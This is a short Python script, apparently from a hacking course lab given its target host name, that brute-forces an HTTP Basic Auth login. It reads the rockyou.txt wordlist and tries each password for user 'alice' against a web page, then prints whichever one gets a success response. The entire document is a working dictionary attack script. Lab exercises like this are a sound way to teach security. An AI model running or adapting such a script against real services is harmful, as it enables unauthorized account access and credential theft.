import requests
from requests.auth import HTTPBasicAuth

with open('rockyou.txt') as file:
    for line in file:
        print("Now trying " + line.rstrip())
        response = requests.get('https://w05-s01.polarbear-hacking.com/home/basic.php', auth=HTTPBasicAuth('alice', line.rstrip()))
        if(response.status_code == 200):
            print('Success! Password:' + line.rstrip())
            exit()